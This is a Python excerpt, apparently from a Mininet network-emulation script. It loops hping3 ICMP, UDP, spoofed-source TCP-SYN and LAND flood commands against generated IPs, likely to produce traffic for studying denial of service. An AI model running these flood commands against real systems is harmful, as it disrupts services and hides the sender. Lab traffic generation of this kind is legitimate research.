...
def perform_icmp_flood(source_host, destination_ip):
    ...
    source_host.cmd("timeout 20s hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood {}".format(destination_ip))
    sleep(100)

def perform_udp_flood(source_host, destination_ip):
    print("Performing UDP Flood")
    source_host.cmd("timeout 20s hping3 -2 -V -d 120 -w 64 --rand-source --flood {}".format(destination_ip))
    sleep(100)

def perform_tcp_syn_flood(source_host, destination_ip):
    print("Performing TCP-SYN Flood")
    source_host.cmd('timeout 20s hping3 -S -V -d 120 -w 64 -p 80 --rand-source --flood {}'.format(destination_ip))
    sleep(100)

def perform_land_attack(source_host, destination_ip):
    print("Performing LAND Attack")
    source_host.cmd("timeout 20s hping3 -1 -V -d 120 -w 64 --flood -a {} {}".format(destination_ip, destination_ip))
    sleep(100)
...
def start_network():
    ...
    # Perform attacks
    for _ in range(3):  # Perform each attack three times
        source_host = choice(hosts)
        destination_ip = ip_generator()

        perform_icmp_flood(source_host, destination_ip)
        perform_udp_flood(source_host, destination_ip)
        perform_tcp_syn_flood(source_host, destination_ip)
        perform_land_attack(source_host, destination_ip)

        sleep(100)  # Add a sleep period between attacks
